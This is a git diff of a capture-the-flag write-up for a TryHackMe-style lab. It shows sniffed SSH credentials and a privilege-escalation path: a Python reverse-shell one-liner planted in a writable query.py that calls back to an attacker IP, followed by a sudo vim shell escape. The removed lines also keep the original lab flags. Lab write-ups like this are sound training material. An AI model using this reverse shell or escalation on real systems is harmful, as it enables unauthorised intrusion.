@@ -84,7 +84,9 @@ Using Wireshark we can easy see the username and password of the user.
   </script>
  </body>
 </html>
-![[Pasted image 20240617150919.png]]
+
+![Pasted image 20240617150919](https://github.com/BGhoster/Write-Ups/assets/43526966/5add2574-50c4-462a-9e36-9e0d9ff69a3c)
+
 ### username password
 username Daniel
 password=C@ughtm3napping123
@@ -93,6 +95,11 @@ password=C@ughtm3napping123
 ssh daniel@10.10.184.22
 ```
 
+```bash
+id
+```
+
+
 ### Finding files with group admin priveldges
 ```bash
 find / -group administrators -type f 2>/dev/null
@@ -100,10 +107,12 @@ find / -group administrators -type f 2>/dev/null
 
 or
 ### PSPY
-![[Pasted image 20240617152236.png]]
+![Pasted image 20240617152236](https://github.com/BGhoster/Write-Ups/assets/43526966/549e6b64-4711-4f92-bf9a-46eb838f5fc5)
+
 ## Getting reverse shell
 Add reverse shell to query.py and wait for shell. We can change this file because we are part of the administrator group.
-![[Pasted image 20240617153532.png]]
+![Pasted image 20240617153532](https://github.com/BGhoster/Write-Ups/assets/43526966/00ce065d-8511-4676-a5a8-ac9f9228c188)
+
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.53.104",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
 ```
@@ -137,17 +146,18 @@ ssh adrian@10.10.184.22
 ```bash
 cat user.txt
 ```
-	THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}
+	THM{REMOVED}
 
 ## Privilege Escalation 
 ```bash
 sudo -l
 ```
-![[Pasted image 20240617154627.png]]
+![Pasted image 20240617154627](https://github.com/BGhoster/Write-Ups/assets/43526966/ad73d5fc-85ca-4a9f-b18e-6955b05603fa)
+
 ```bash
 sudo vim -c ':!/bin/sh'
 ```
 ```bash
 cd /root; cat root.txt
 ```
-	THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}
+	THM{REMOVED}
